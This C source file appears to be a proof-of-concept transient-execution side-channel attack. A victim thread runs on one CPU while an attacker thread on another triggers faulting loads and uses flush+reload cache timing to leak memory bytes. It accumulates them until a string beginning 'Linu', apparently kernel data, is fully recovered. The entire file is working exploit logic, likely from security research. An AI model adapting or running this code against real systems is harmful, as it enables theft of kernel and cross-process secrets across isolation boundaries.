#include "header.h"
#define PAGE_SIZE 4096

uint32_t perm[16] = {0};

void set_cpu(int cpuid)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpuid, &cpuset);
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0)
    {
        printf("pthread_setaffinity_np failed!");
        exit(1);
    }
}

long offset = 0;
char __attribute__((aligned(PAGE_SIZE))) leak[PAGE_SIZE];

void *victim(void *ptr)
{
    set_cpu(CPU_VICTIM);

    while (1)
        VICTIM_ROUTINE(offset);
}

int main(int argc, char *argv[])
{

    setup_kernel_module();

    offset = atoi(argv[2]);

#if !SINGLE_THREAD
    pthread_t tVictim;
    pthread_create(&tVictim, NULL, victim, NULL);
    for (int i = 0; i < 10000000; i++)
        ;
#endif

    set_cpu(CPU_ATTACKER);
    setup_pages();
    setup_oracle();
    setup_fh();
    map_create();

    for (int i = 0; i < 16; i++)
    {
        perm[i] = i + atoi(argv[1]);
    }

#define CHECK_THRESHOLD 10
#define TAG "Linu"
#if KERNEL_GADGET_SAFE
#define TARGET_MSG_LEN 126
#else
#define TARGET_MSG_LEN 236
#endif

    memset(leak, 0, PAGE_SIZE);
    memcpy(leak, TAG, BYTES_TO_TRY / 2);

    uint32_t counter = 0;
    uint32_t off = 0;

    while (1)
    {

        if (!setjmp(trycatch_buf))
            s_load_encode(perm);

        char indexes[10];
        memset(indexes, 0, sizeof(indexes));

        for (size_t c = 0; c < BYTES_TO_TRY; c++)
        {
#if 1
            for (size_t i = 0; i < 256; i++)
            {
#else
            for (size_t i = 33; i < 126; i++)
            {
#endif
                int mix_i = i;
                if (flush_reload((uint8_t *)&oracles + (i + (c * 256)) * PAGE_SIZE))
                {
                    indexes[c] = (i + (c * 256)) % 256;
                }
            }
        }

        if (strlen(indexes) == BYTES_TO_TRY)
        {
            map_increment(indexes);
            counter++;
        }

        if (counter == CHECK_THRESHOLD)
        {
            counter = 0;
            const char *found = map_search_prefix(leak + off, BYTES_TO_TRY / 2);
            // map_dump();
            // printf("------------ %ld\n", offset);
            if (found != NULL && map_get(found) > CHECK_THRESHOLD)
            {
                memcpy(leak + off, found, BYTES_TO_TRY);
                offset += BYTES_TO_TRY / 2;
                off += BYTES_TO_TRY / 2;
#if 1
                printf("Found: %s\nTotal Leak: %lu\n%s\n---\n", found, strlen(leak), leak);
                if (strlen(leak) == TARGET_MSG_LEN)
                {
                    exit(0);
                }
#else
                if (strlen(leak) == TARGET_MSG_LEN)
                {
                    printf("%s: %lu\n %s\n", found, map_get(found), leak);
                    exit(0);
                }
#endif

                map_clear();
            }
        }
    }
    return 0;
}
